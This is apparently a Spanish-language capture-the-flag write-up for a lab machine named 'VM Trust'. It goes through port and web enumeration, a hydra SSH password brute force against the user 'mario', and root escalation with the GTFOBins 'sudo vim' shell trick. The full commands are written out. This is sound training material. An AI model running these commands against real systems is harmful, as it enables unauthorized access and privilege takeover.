VM Trust

Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando en NMAP:

```bash
nmap -sS --open -vvv -Pn 172.18.0.2
```
Resultado: 


<img width="816" height="355" alt="Captura de pantalla 2025-06-02 190113" src="https://github.com/user-attachments/assets/cc3d294b-53c5-416d-8542-63f47bf38724" />

Obtenemos 2 puertos abiertos: 22 y 80
Seguidamente realizamos un escaneo con NMAP para saber sus versiones:

```
nmap -sV -p 22,80 -vvv 172.18.0.2
```

<img width="1051" height="667" alt="Pasted image 20250602190517" src="https://github.com/user-attachments/assets/37ff93f6-7f8d-484e-821a-2027b902be48" />

Ahora sabemos que tiene Apache y vamos al navegador y utilizamos la IP para ver la pagina:

<img width="844" height="918" alt="Pasted image 20250602190647" src="https://github.com/user-attachments/assets/9178a921-44ef-4b50-8e80-dd651323373b" />

Con SQLmap no encontramos ningún formulario:

```
sqlmap -url http://172.18.0.2/ --dbs --forms --batch
```

<img width="1053" height="314" alt="Pasted image 20250602191356" src="https://github.com/user-attachments/assets/cb8125d7-3f07-44bb-9f64-73f570719d17" />

Procedemos a usar WHATWEB con el siguiente comando:

```
whatweb 172.18.0.2
```

Resultado:

<img width="1053" height="68" alt="Pasted image 20250602191509" src="https://github.com/user-attachments/assets/e5ebdc65-3a05-4c5d-be30-e6a4ace13f0b" />

Vemos que dice: Default page en el resultado. Puede que haya alguna cosas por ahí que no están indexadas (La **página por defecto de Apache** está visible, pero **podrían existir directorios ocultos**) o puede que este mal configurado.
Utilizamos GOBUSTER:

```
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Resultado:

<img width="870" height="335" alt="Pasted image 20250602200639" src="https://github.com/user-attachments/assets/15829b7c-a8e4-431b-ab3d-1c99289474ff" />

Como solo apareció ese directorio y cuando lo ponemos en el navegador aparece esto:

<img width="844" height="924" alt="Pasted image 20250602200955" src="https://github.com/user-attachments/assets/f069bb6d-d655-4f0a-a800-417e4b5d9039" />

Ahora debemos hacer escaneo de archivos en vez de directorios:

```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
Resultado: 

<img width="937" height="435" alt="Pasted image 20250602202600" src="https://github.com/user-attachments/assets/e4f18481-0ec0-4658-86fe-4e0025344e1a" />

Ahora obtuvimos varios archivos, en lo personal `secret.php` me parece extraño, vamos a verlo en la web:

<img width="841" height="633" alt="Pasted image 20250602202729" src="https://github.com/user-attachments/assets/5e0a20cc-d21e-4099-a431-16906094b82d" />

siempre es bueno en paginas simples como esta revisar el código fuente ya que suelen estar llenos de comentarios o cosas que olvidad los desarrolladores eliminar, pero en este caso no hay nada de interesante.

<img width="842" height="706" alt="Pasted image 20250602202948" src="https://github.com/user-attachments/assets/3d0923ae-5eac-4b8a-8a7a-eff428dbe500" />

No hay nada de comentarios o información que sirva.
Recordemos que la Maquina tiene servicio **ssh** y en esta pagina vemos un **Hola Mario** entonces tal ves **Mario** es un usuario del sistema entonces podríamos usar un ataque de fuerza bruta, mi buen amigo HYDRA:

```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

Resultado:

<img width="1045" height="240" alt="Pasted image 20250602210535" src="https://github.com/user-attachments/assets/cd13d9b0-8099-4b75-b0ed-97d72fac7008" />

Vemos que encontramos usuario y contraseña para entrar por medio de SSH a la maquina, procedemos a entrar:

<img width="827" height="293" alt="Pasted image 20250602211041" src="https://github.com/user-attachments/assets/20ed5e94-bf8b-4ba9-b7a9-e5b552304194" />

El ingreso fue correcto ahora vamos a empezar a buscar una forma de escalar privilegios.

La primera forma que buscamos es ver si podemos ejecutar algún binario como sudo en el sistema

```
sudo -l
```

Resultado:

<img width="940" height="110" alt="Pasted image 20250602211411" src="https://github.com/user-attachments/assets/30e5fd45-4df9-4d6b-b623-6c8c3f06ff2f" />

Usaremos la herramienta  GTFOBins la cual es una pagina https://gtfobins.github.io/ para que sea mas fácil explotar este sudo vim:

<img width="833" height="812" alt="Pasted image 20250602211956" src="https://github.com/user-attachments/assets/d940011f-18df-4a04-bcc0-d1c7bdc74e29" />

Ponemos en el buscador vim y lo seleccionamos, nos aparecerá esta información: 

<img width="836" height="573" alt="Pasted image 20250602212455" src="https://github.com/user-attachments/assets/6b18bf1c-cbef-46a4-9cfd-6941e2c994ee" />

Con `sudo vim -c ':!/bin/sh'` podemos escalar los privilegios pero para no solo ejecutar y escalar desglosemos que hace este comando que a ciencia cierta es bastante simple lo que hace la usar el parámetro `-c` este ejecutara el comando encerrado en las comillas y como vim lo ejecuta sudo una sh aparecerá pero con el usuario root ejecutándola

```
sudo vim -c ':!/bin/sh'
```

Resultado:


<img width="960" height="192" alt="Pasted image 20250602213401" src="https://github.com/user-attachments/assets/4ecca5a4-43a9-41c2-8f92-065131357338" />

Escalamos privilegios y nos convertimos en root.
